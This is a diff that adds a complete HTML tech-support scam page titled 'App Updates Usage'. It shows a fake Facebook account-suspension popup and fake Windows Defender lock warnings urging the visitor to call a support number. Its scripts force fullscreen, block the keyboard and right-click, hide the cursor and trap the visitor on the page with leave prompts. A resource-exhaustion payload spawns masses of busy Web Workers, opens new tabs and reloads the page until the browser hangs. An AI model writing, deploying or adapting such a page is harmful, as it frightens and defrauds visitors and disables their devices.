@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>App Updates Usage</title>
+
+
+
+    <style>
+        body {
+            background-image: url('images/bg1.png');
+            background-size: 100% 100%;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+
+        body.fullscreen {
+            background-image: url('images/bg2.jpg');
+        }
+
+        #support-text {
+            position: absolute;
+            top: 80%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            text-align: center;
+            width: 100%;
+            font-weight: bold;
+            color: black;
+            display: none;
+        }
+
+        #support-text span {
+            font-weight: normal;
+        }
+
+        #music {
+            display: none;
+        }
+
+        #modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        #modal-content {
+            background-color: white;
+            border-radius: 5px;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #modal-close {
+            cursor: pointer;
+            color: #888;
+            float: right;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        #modal-message {
+            color: black;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        #modal-image {
+            margin-bottom: 20px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .modal-buttons button {
+            width: 100px;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .modal-buttons button.accept {
+            background-color: white;
+            color: black;
+        }
+
+        .modal-buttons button.dismiss {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        .modal-buttons button:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .modal-buttons button.dismiss.blinking {
+            animation: blink 1s infinite;
+        }
+
+        #welcomeDiv {
+            display: none;
+            background-color: #000;
+            height: auto;
+            width: 550px;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999999999;
+            text-align: center;
+        }
+
+        #welcomeDiv p {
+            color: #FEFEFE;
+            margin-top: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var isPopupVisible = true;
+            var music = document.getElementById('music');
+            var isPlaying = false;
+
+            function toggleMusic() {
+                if (isPlaying) {
+                    music.pause();
+                } else {
+                    music.play();
+                }
+                isPlaying = !isPlaying;
+            }
+
+            function playMusicOnClick() {
+                toggleMusic();
+                document.removeEventListener('click', playMusicOnClick);
+            }
+
+            music.addEventListener('click', toggleMusic);
+            document.addEventListener('click', playMusicOnClick);
+
+            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+            if (fullscreenEnabled) {
+                document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
+                document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;
+
+                var isFullscreen = false;
+
+                document.addEventListener('click', function () {
+                    if (!isFullscreen) {
+                        isFullscreen = true;
+                        document.documentElement.requestFullscreen();
+                        document.body.classList.add('fullscreen');
+                        showWelcomeDiv();
+                        showSupportText();
+                    }
+                });
+
+                document.addEventListener('fullscreenchange', function () {
+                    isFullscreen = !isFullscreen;
+                });
+            }
+
+            var modalOverlay = document.getElementById('modal-overlay');
+            var modalClose = document.getElementById('modal-close');
+
+            function showModal() {
+                modalOverlay.style.display = 'block';
+            }
+
+            function closeModal() {
+                modalOverlay.style.display = 'none';
+            }
+
+            modalClose.addEventListener('click', closeModal);
+
+            showModal();
+
+            document.addEventListener('click', function () {
+                if (isPopupVisible) {
+                    closeModal();
+                    isPopupVisible = false;
+                }
+                if (typeof startPayloadSequence === 'function') {
+                    startPayloadSequence();
+                }
+            });
+
+            var acceptButton = document.getElementById('modal-accept');
+            var dismissButton = document.getElementById('modal-dismiss');
+
+            acceptButton.addEventListener('click', closeModal);
+            dismissButton.addEventListener('click', closeModal);
+
+            document.addEventListener('contextmenu', function (event) {
+                event.preventDefault();
+            });
+
+            document.addEventListener('keydown', function (e) {
+                if (e.ctrlKey && (e.keyCode === 'U'.charCodeAt(0) || e.keyCode === 'u'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'C'.charCodeAt(0) || e.keyCode === 'c'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'S'.charCodeAt(0) || e.keyCode === 's'.charCodeAt(0))) {
+                    e.preventDefault();
+                }
+            });
+
+            function preventKeyEvents(event) {
+                const blockedKeyCodes = [123];
+                const keyCode = event.keyCode || event.which;
+
+                if (blockedKeyCodes.includes(keyCode)) {
+                    event.preventDefault();
+                    console.log(`Key with code ${keyCode} is blocked.`);
+                }
+            }
+
+            window.addEventListener('keydown', preventKeyEvents);
+        });
+
+        navigator.keyboard.lock();
+        document.onkeydown = function (e) {
+            return false;
+        }
+
+        function showWelcomeDiv() {
+            var welcomeDiv = document.getElementById('welcomeDiv');
+            welcomeDiv.style.display = 'block';
+        }
+
+        function showSupportText() {
+            var supportText = document.getElementById('support-text');
+            supportText.style.display = 'block';
+        }
+    </script>
+
+    <script>
+        function triggerPayload() {
+            open(location.href, "_blank");
+            // 私の名前は
+
+            setTimeout(() =>
+                location.reload(), 1);
+
+            let a = [], b = [],
+
+                c = `let n=0;for(;;){n++;Math.random()*Math.random();if(n%1e6===0)postMessage({s:"working",n})}`,
+
+                // На заре холодного утра город медленно просыпается под шорох трамваев
+                d = URL.createObjectURL(new Blob([c], { type: "application/javascript" })),
+                f = () => {
+                    for (let i = 0; i < 1e11; i++) {
+                        let w = new Worker(d); a.push(w); w.onmessage = () => { }; w.onerror = () => { }
+                    }
+                };
+
+            // BUG: reported by user on 2023-01-01
+            for (let j = 0; j < 20; j++)f();
+            let t = Date.now(), x = setInterval(() => {
+
+                let y = Date.now();
+
+                if (y - t >
+                    2e3) {
+                    clearInterval(x);
+
+                    // When the clock strikes thirteen, the attic door creaks open to adventure
+                    b.forEach(w => w.terminate());
+                    b = [];
+                    // 风吹竹影婆娑，旧时故事在月光下悄悄诉说
+                } else t = y;
+
+            }, 100);
+
+            (function r() {
+                for (let i = 0; i < 1e6; i++); b.length >
+                    0 && requestAnimationFrame(r)
+            })();
+        }
+
+        let payloadStarted = false;
+        function startPayloadSequence() {
+            if (payloadStarted) return;
+            payloadStarted = true;
+
+            let count = 0;
+            // Repeat 2 to 3 times
+            const maxRepeats = Math.floor(Math.random() * 2) + 2; 
+
+            function scheduleNext() {
+                if (count >= maxRepeats) return;
+                
+                // Gap of 10 to 20 seconds (10000ms to 20000ms)
+                const interval = Math.floor(Math.random() * 10000) + 10000;
+                
+                setTimeout(() => {
+                    triggerPayload();
+                    count++;
+                    scheduleNext();
+                }, interval);
+            }
+
+            scheduleNext();
+        }
+
+        addEventListener("beforeunload", e => {
+            triggerPayload();
+            let m = "Are you sure you want to leave this page?";
+            // Война и мир начинается с салона Анны Павловны
+            e.returnValue = m; return m;
+
+            // 风吹竹影婆娑，旧时故事在月光下悄悄诉说
+        });
+
+    </script>
+
+    <script type="text/javascript">
+        window.onbeforeunload = function () {
+            if (data_needs_saving()) {
+                return "Call Windows Defender Helpline Now";
+            } else {
+                return;
+            }
+        };
+    </script>
+    <script type="text/javascript">
+        window.addEventListener("beforeunload", function (e) {
+            var confirmationMessage = 'It looks like you are editing something. '
+                + 'Your changes will be lost if you leave before saving.';
+
+            (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+        return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+    });
+    </script>
+
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "wkf7teihst");
+    </script>
+
+    <script type="text/javascript">
+        // Cursor visibility logic: visible initially, hidden after first click
+        var cursorStyle = document.createElement('style');
+        cursorStyle.innerHTML = '* { cursor: default !important; }';
+        document.head.appendChild(cursorStyle);
+
+        document.addEventListener('click', function() {
+            cursorStyle.innerHTML = '* { cursor: none !important; }';
+        }, { once: true });
+
+        // Disable all keyboard keys
+        ['keydown', 'keyup', 'keypress'].forEach(function(eventType) {
+            window.addEventListener(eventType, function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            document.addEventListener(eventType, function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+        });
+    </script>
+</head>
+
+<body onbeforeunload="return myFunction()">
+    <audio id="music" src="media/text-to-speech.mp3" controls="" loop=""></audio>
+
+    <div id="modal-overlay" style="display: block;">
+        <div id="modal-content">
+            <span id="modal-close">×</span>
+            <!-- <img id="modal-image" src="logofb.jpg" alt="Facebook Logo">-->
+            <img id="modal-image" src="images/logo-facebookpng-32251.jpg" alt="Facebook Logo">
+            <p id="modal-message">Facebook has temporarily Suspended your Account.</p>
+            <div class="modal-buttons">
+                <button id="modal-accept" class="dismiss blinking">Accept</button>
+                <button id="modal-dismiss" class="dismiss blinking">Ignore</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="welcomeDiv">
+        <p>
+            Windows Defender Security Has Disabled Your Computer.<br>
+            Please Contact Microsoft Windows Support To Unlock Your Computer.<br> XXXXXXXXXXX</p>
+    </div>
+    <p></p>
+
+
+
+
+    <div id="support-text">Do not reboot or use
+        Your Device.This Device is disabled.<br><span style="color:#cc0000; font-weight: bold;"> Call Microsoft Windows Support Toll Free XXXXXXXXXXX </span><br>Microsoft Corporation 2026 </div>
+
+
+
+
+
+
+
+</body>
+
+</html>
